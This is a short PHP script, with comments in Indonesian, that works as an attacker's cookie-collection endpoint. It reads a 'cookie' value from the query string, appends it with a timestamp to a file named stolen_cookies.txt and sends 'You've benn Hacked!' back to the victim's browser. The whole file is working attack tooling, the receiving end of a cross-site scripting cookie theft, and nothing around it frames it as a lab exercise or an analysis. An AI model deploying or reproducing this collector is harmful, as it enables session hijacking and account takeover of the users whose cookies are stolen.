<?php
    if (isset($_GET['cookie'])) {
        $stolenCookie = $_GET['cookie'];
        $logFile = 'stolen_cookies.txt';

        // Format data yang akan disimpan
        $logEntry = '[' . date('Y-m-d H:i:s') . '] Cookie: ' . $stolenCookie . "\n";

        // Tambahkan data ke file log
        file_put_contents($logFile, $logEntry, FILE_APPEND);

        // Beri respons sederhana ke browser korban
        echo "You've benn Hacked!";
    } else {
        echo "No!";
    }
?>
